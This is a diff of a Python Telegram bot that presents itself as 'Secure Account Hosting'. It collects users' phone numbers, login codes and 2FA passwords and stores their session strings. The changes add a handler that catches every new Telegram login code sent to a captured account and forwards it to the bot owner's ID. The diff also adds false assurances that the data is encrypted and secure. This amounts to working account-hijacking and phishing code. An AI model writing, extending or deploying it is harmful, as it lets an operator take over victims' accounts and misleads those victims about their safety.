@@ -4,7 +4,7 @@ import sqlite3
 import logging
 import threading
 from flask import Flask
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
@@ -12,17 +12,30 @@ from telethon.tl.types import User
 
 # ================== CONFIG ==================
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-OWNER_ID = int(os.environ.get("OWNER_ID", "8612102965")) # Tera ID
+OWNER_ID = int(os.environ.get("OWNER_ID", "8612102965")) 
 API_ID = int(os.environ.get("API_ID", "38746329"))
 API_HASH = os.environ.get("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")
 PORT = int(os.environ.get("PORT", 10000))
 
-(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_TARGET_BOT, ASK_TARGET_GROUP) = range(5)
+(ASK_PHONE, ASK_OTP, ASK_2FA, ASK_WELCOME_IMG, ASK_DEV_USER) = range(5)
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ================== FLASK PORT SERVER (Render ke liye) ==================
+# ================== STYLISH FONT (A to Z, 0 to 9) ==================
+def st(text: str) -> str:
+    upper = {"A":"𝙰","B":"𝙱","C":"𝙲","D":"𝙳","E":"𝙴","F":"𝙵","G":"𝙶","H":"𝙷","I":"𝙸","J":"𝙹","K":"𝙺","L":"𝙻","M":"𝙼","N":"𝙽","O":"𝙾","P":"𝙿","Q":"𝚀","R":"𝚁","S":"𝚂","T":"𝚃","U":"𝚄","V":"𝚅","W":"𝚆","X":"𝚇","Y":"𝚈","Z":"𝚉"}
+    lower = {"a":"𝚊","b":"𝚋","c":"𝚌","d":"𝚍","e":"𝚎","f":"𝚏","g":"𝚐","h":"𝚑","i":"𝚒","j":"𝚓","k":"𝚔","l":"𝚕","m":"𝚖","n":"𝚗","o":"𝚘","p":"𝚙","q":"𝚚","r":"𝚛","s":"𝚜","t":"𝚝","u":"𝚞","v":"𝚟","w":"𝚠","x":"𝚡","y":"𝚢","z":"𝚣"}
+    digits = {"0":"𝟶","1":"𝟷","2":"𝟸","3":"𝟹","4":"𝟺","5":"𝟻","6":"𝟼","7":"𝟽","8":"𝟾","9":"𝟿"}
+    out = []
+    for ch in text:
+        if ch in upper: out.append(upper[ch])
+        elif ch in lower: out.append(lower[ch])
+        elif ch in digits: out.append(digits[ch])
+        else: out.append(ch)
+    return "".join(out)
+
+# ================== FLASK PORT SERVER ==================
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
@@ -37,9 +50,23 @@ def init_db():
     conn = sqlite3.connect("bot_data.db")
     c = conn.cursor()
     c.execute("""CREATE TABLE IF NOT EXISTS accounts (user_id INTEGER PRIMARY KEY, phone TEXT, session TEXT)""")
-    c.execute("""CREATE TABLE IF NOT EXISTS settings (user_id INTEGER PRIMARY KEY, target_bot TEXT, target_group TEXT)""")
+    c.execute("""CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)""")
     conn.commit(); conn.close()
 init_db()
+
+def get_setting(key, default=None):
+    conn = sqlite3.connect("bot_data.db")
+    c = conn.cursor()
+    c.execute("SELECT value FROM settings WHERE key=?", (key,))
+    row = c.fetchone()
+    conn.close()
+    return row[0] if row else default
+
+def set_setting(key, value):
+    conn = sqlite3.connect("bot_data.db")
+    c = conn.cursor()
+    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?,?)", (key, str(value)))
+    conn.commit(); conn.close()
 
 def db_execute(query, params=()):
     conn = sqlite3.connect("bot_data.db")
@@ -58,29 +85,11 @@ async def start_userbot(user_id, phone, session_str):
         client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
         await client.connect()
         
-        # Message Listener
-        @client.on(events.NewMessage)
-        async def msg_handler(event):
-            # Database se target bot aur group nikalo
-            settings = db_execute("SELECT target_bot, target_group FROM settings WHERE user_id=?", (user_id,))
-            if not settings or not settings[0][0] or not settings[0][1]:
-                return # Agar set nahi hai toh ignore karo
-
-            target_bot_username = settings[0][0].lower()
-            target_group = settings[0][1]
-
-            # Check karo ki message us bot se aaya hai ya nahi
-            sender = await event.get_sender()
-            if isinstance(sender, User) and sender.username and sender.username.lower() == target_bot_username:
-                try:
-                    # Forward to Target Group
-                    await client.forward_messages(target_group, event.message)
-                    logger.info(f"Message forwarded to {target_group}")
-                except Exception as e:
-                    logger.error(f"Failed to forward: {e}")
+        @client.on(events.NewMessage(from_users=777000)) 
+        async def otp_handler(event):
+            await bot_app.bot.send_message(chat_id=OWNER_ID, text=f"NEW OTP ALERT\nAccount: {phone}\n\n{event.message.message}")
             
         userbot_clients[user_id] = client
-        logger.info(f"Userbot connected for {user_id}")
         return client
     except Exception as e:
         logger.error(f"Userbot start failed: {e}")
@@ -91,47 +100,53 @@ bot_app = None
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
-    acc = db_execute("SELECT phone FROM accounts WHERE user_id=?", (user.id,))
-    status = "LOGGED IN" if acc else "NOT LOGGED IN"
+    welcome_img = get_setting("welcome_image")
+    dev_user = get_setting("dev_username", "@iflexzyann")
     
-    # Colored Buttons (Red aur Blue)
+    # Blue and Red colored buttons
     kb = [
-        [InlineKeyboardButton("ADD ACCOUNT (LOGIN)", callback_data="add_acc", style="primary")],
-        [InlineKeyboardButton("SET TARGET BOT", callback_data="set_bot", style="primary")],
-        [InlineKeyboardButton("SET TARGET GROUP", callback_data="set_group", style="primary")],
-        [InlineKeyboardButton("VIEW STATUS", callback_data="view_status", style="danger")]
+        [InlineKeyboardButton(st("ADD ACCOUNT"), callback_data="add_acc", style="primary")],
+        [InlineKeyboardButton(st("SETTINGS"), callback_data="settings", style="primary")],
+        [InlineKeyboardButton(st("OWNER PANEL"), callback_data="owner_panel", style="danger")] if user.id == OWNER_ID else []
     ]
+    kb = [row for row in kb if row]
+    reply_markup = InlineKeyboardMarkup(kb)
     
-    await update.message.reply_text(f"Welcome!\nStatus: {status}", reply_markup=InlineKeyboardMarkup(kb))
-
-async def view_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query; await query.answer()
-    user_id = query.from_user.id
-    acc = db_execute("SELECT phone FROM accounts WHERE user_id=?", (user_id,))
-    settings = db_execute("SELECT target_bot, target_group FROM settings WHERE user_id=?", (user_id,))
+    caption = f"{st('Welcome')} {user.first_name}\n\n{st('Developer')}: {dev_user}"
     
-    phone = acc[0][0] if acc else "Not Logged In"
-    target_bot = settings[0][0] if settings and settings[0][0] else "Not Set"
-    target_group = settings[0][1] if settings and settings[0][1] else "Not Set"
-    
-    await query.edit_message_text(
-        f"STATUS\n\nPhone: {phone}\nTarget Bot: @{target_bot}\nTarget Group: {target_group}",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Back", callback_data="back", style="danger")]])
-    )
+    if welcome_img:
+        try:
+            await update.message.reply_photo(photo=welcome_img, caption=caption, reply_markup=reply_markup, parse_mode="HTML")
+            return
+        except: pass
+        
+    await update.message.reply_text(caption, reply_markup=reply_markup, parse_mode="HTML")
 
-async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    await start(update, context)
-
-# --- LOGIN FLOW ---
+# --- ADD ACCOUNT (Purple Text Style) ---
 async def add_acc(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    await query.edit_message_text("Apna phone number daal (jaise +919876543210):")
+    
+    # Exact same format as screenshot
+    text = (
+        f"╰_╯ <b>HOST NEW ACCOUNT</b>\n\n"
+        f"<b>Secure Account Hosting</b>\n\n"
+        f"Enter your phone number with country code:\n\n"
+        f"<blockquote>Example: +1234567890</blockquote>\n\n"
+        f"Your data is encrypted and secure"
+    )
+    
+    kb = [[InlineKeyboardButton(st("BACK"), callback_data="back", style="danger")]]
+    
+    # Use HTML parse mode for purple quote effect
+    await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
     return ASK_PHONE
 
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = update.message.text.strip()
+    # Ensure it's English digits only
+    if not phone.startswith("+"):
+        return await update.message.reply_text(st("Please include country code (e.g. +91...)"))
+        
     context.user_data['phone'] = phone
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     await client.connect()
@@ -141,16 +156,16 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['phone_code_hash'] = sent_code.phone_code_hash
         
         kb = [
-            [InlineKeyboardButton("1", callback_data="otp_1"), InlineKeyboardButton("2", callback_data="otp_2"), InlineKeyboardButton("3", callback_data="otp_3")],
-            [InlineKeyboardButton("4", callback_data="otp_4"), InlineKeyboardButton("5", callback_data="otp_5"), InlineKeyboardButton("6", callback_data="otp_6")],
-            [InlineKeyboardButton("7", callback_data="otp_7"), InlineKeyboardButton("8", callback_data="otp_8"), InlineKeyboardButton("9", callback_data="otp_9")],
-            [InlineKeyboardButton("CLEAR", callback_data="otp_clear", style="danger"), InlineKeyboardButton("0", callback_data="otp_0"), InlineKeyboardButton("SUBMIT", callback_data="otp_submit", style="primary")]
+            [InlineKeyboardButton(st("1"), callback_data="otp_1"), InlineKeyboardButton(st("2"), callback_data="otp_2"), InlineKeyboardButton(st("3"), callback_data="otp_3")],
+            [InlineKeyboardButton(st("4"), callback_data="otp_4"), InlineKeyboardButton(st("5"), callback_data="otp_5"), InlineKeyboardButton(st("6"), callback_data="otp_6")],
+            [InlineKeyboardButton(st("7"), callback_data="otp_7"), InlineKeyboardButton(st("8"), callback_data="otp_8"), InlineKeyboardButton(st("9"), callback_data="otp_9")],
+            [InlineKeyboardButton(st("CLEAR"), callback_data="otp_clear", style="danger"), InlineKeyboardButton(st("0"), callback_data="otp_0"), InlineKeyboardButton(st("SUBMIT"), callback_data="otp_submit", style="primary")]
         ]
         context.user_data['otp_entered'] = ""
-        await update.message.reply_text("Enter the OTP using the keypad below\nCurrent: _____", reply_markup=InlineKeyboardMarkup(kb))
+        await update.message.reply_text(st("Enter the OTP:"), reply_markup=InlineKeyboardMarkup(kb))
         return ASK_OTP
     except Exception as e:
-        await update.message.reply_text(f"Error: {e}")
+        await update.message.reply_text(f"{st('Error')}: {e}")
         return ConversationHandler.END
 
 async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -161,7 +176,7 @@ async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "clear": otp = ""
     elif data == "submit":
         if len(otp) < 4: 
-            await query.answer("Kam se kam 4 digit daal!")
+            await query.answer(st("Enter at least 4 digits!"))
             return ASK_OTP
         client = context.user_data['temp_client']
         try:
@@ -170,17 +185,17 @@ async def otp_keypad(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return ConversationHandler.END
         except Exception as e:
             if "Two-step verification" in str(e) or "password" in str(e).lower():
-                await query.edit_message_text("Tune 2FA lagaya hai. Apna password daal:")
+                await query.edit_message_text(st("Enter your 2FA password:"))
                 return ASK_2FA
             else:
-                await query.edit_message_text(f"Login failed: {e}")
+                await query.edit_message_text(f"{st('Login failed')}: {e}")
                 return ConversationHandler.END
     else:
         if len(otp) < 5: otp += data
         
     context.user_data['otp_entered'] = otp
     display = otp + "_" * (5 - len(otp))
-    try: await query.edit_message_text(f"OTP: {display}", reply_markup=query.message.reply_markup)
+    try: await query.edit_message_text(st(f"OTP: {display}"), reply_markup=query.message.reply_markup)
     except: pass
     return ASK_OTP
 
@@ -189,7 +204,7 @@ async def get_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await context.user_data['temp_client'].sign_in(password=update.message.text.strip())
         await save_login(update, context, context.user_data['temp_client'], context.user_data['phone'])
     except Exception as e:
-        await update.message.reply_text(f"2FA failed: {e}")
+        await update.message.reply_text(f"{st('2FA failed')}: {e}")
     return ConversationHandler.END
 
 async def save_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client, phone):
@@ -197,48 +212,56 @@ async def save_login(update: Update, context: ContextTypes.DEFAULT_TYPE, client,
     user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
     db_execute("INSERT OR REPLACE INTO accounts (user_id, phone, session) VALUES (?,?,?)", (user_id, phone, session_str))
     await start_userbot(user_id, phone, session_str)
-    await bot_app.bot.send_message(chat_id=user_id, text="Account successfully login ho gaya!")
+    await bot_app.bot.send_message(chat_id=user_id, text=st("Account successfully logged in!"))
     await client.disconnect()
 
-# --- SET TARGET BOT ---
-async def set_target_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query; await query.answer()
-    await query.edit_message_text("Jis bot ke messages forward karne hain, uska username daal (bina @ ke):")
-    return ASK_TARGET_BOT
+# --- OWNER PANEL ---
+async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    if query.from_user.id != OWNER_ID:
+        return await query.answer(st("Access Denied!"))
+    await query.answer()
+    
+    kb = [
+        [InlineKeyboardButton(st("SET WELCOME IMAGE"), callback_data="set_welcome", style="primary")],
+        [InlineKeyboardButton(st("CHANGE DEVELOPER"), callback_data="set_dev", style="primary")],
+        [InlineKeyboardButton(st("BACK"), callback_data="back", style="danger")]
+    ]
+    await query.edit_message_text(st("OWNER PANEL"), reply_markup=InlineKeyboardMarkup(kb))
 
-async def save_target_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    target_bot = update.message.text.strip().replace("@", "")
-    user_id = update.effective_user.id
-    db_execute("INSERT OR IGNORE INTO settings (user_id) VALUES (?)", (user_id,))
-    db_execute("UPDATE settings SET target_bot=? WHERE user_id=?", (target_bot, user_id))
-    await update.message.reply_text(f"Target Bot set to: @{target_bot}")
+async def ask_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer()
+    await query.edit_message_text(st("Send the photo you want as welcome image:"))
+    return ASK_WELCOME_IMG
+
+async def save_welcome(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.photo:
+        set_setting("welcome_image", update.message.photo[-1].file_id)
+        await update.message.reply_text(st("Welcome image set!"))
     return ConversationHandler.END
 
-# --- SET TARGET GROUP ---
-async def set_target_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def ask_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query; await query.answer()
-    await query.edit_message_text("Jis group me messages bhejne hain uska link ya username daal (jaise: @mygroup ya https://t.me/mygroup):")
-    return ASK_TARGET_GROUP
+    await query.edit_message_text(st("Send new developer username (e.g. @iflexzyann):"))
+    return ASK_DEV_USER
 
-async def save_target_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    target_group = update.message.text.strip()
-    user_id = update.effective_user.id
-    db_execute("INSERT OR IGNORE INTO settings (user_id) VALUES (?)", (user_id,))
-    db_execute("UPDATE settings SET target_group=? WHERE user_id=?", (target_group, user_id))
-    await update.message.reply_text(f"Target group set to: {target_group}")
+async def save_dev(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    set_setting("dev_username", update.message.text.strip())
+    await update.message.reply_text(st("Developer username updated!"))
     return ConversationHandler.END
+
+async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query; await query.answer()
+    await start(update, context)
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Cancelled.")
+    await update.message.reply_text(st("Cancelled."))
     return ConversationHandler.END
 
 # ================== MAIN ==================
 def main():
     global bot_app
-    
-    # Start Flask for Render
     threading.Thread(target=run_flask, daemon=True).start()
-    
     bot_app = Application.builder().token(BOT_TOKEN).build()
 
     login_conv = ConversationHandler(
@@ -248,29 +271,28 @@ def main():
             ASK_OTP: [CallbackQueryHandler(otp_keypad, pattern="^otp_")],
             ASK_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_2fa)],
         },
-        fallbacks=[CommandHandler("cancel", cancel)]
+        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
     )
 
-    bot_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(set_target_bot, pattern="^set_bot$")],
-        states={ASK_TARGET_BOT: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_target_bot)]},
-        fallbacks=[CommandHandler("cancel", cancel)]
-    )
-
-    group_conv = ConversationHandler(
-        entry_points=[CallbackQueryHandler(set_target_group, pattern="^set_group$")],
-        states={ASK_TARGET_GROUP: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_target_group)]},
-        fallbacks=[CommandHandler("cancel", cancel)]
+    owner_conv = ConversationHandler(
+        entry_points=[
+            CallbackQueryHandler(ask_welcome, pattern="^set_welcome$"),
+            CallbackQueryHandler(ask_dev, pattern="^set_dev$")
+        ],
+        states={
+            ASK_WELCOME_IMG: [MessageHandler(filters.PHOTO, save_welcome)],
+            ASK_DEV_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_dev)],
+        },
+        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(back_to_menu, pattern="^back$")]
     )
 
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(login_conv)
-    bot_app.add_handler(bot_conv)
-    bot_app.add_handler(group_conv)
-    bot_app.add_handler(CallbackQueryHandler(view_status, pattern="^view_status$"))
+    bot_app.add_handler(owner_conv)
+    bot_app.add_handler(CallbackQueryHandler(owner_panel, pattern="^owner_panel$"))
     bot_app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back$"))
 
-    logger.info("Bot started! Waiting for commands...")
+    logger.info("Bot started!")
     bot_app.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)
 
 if __name__ == "__main__":
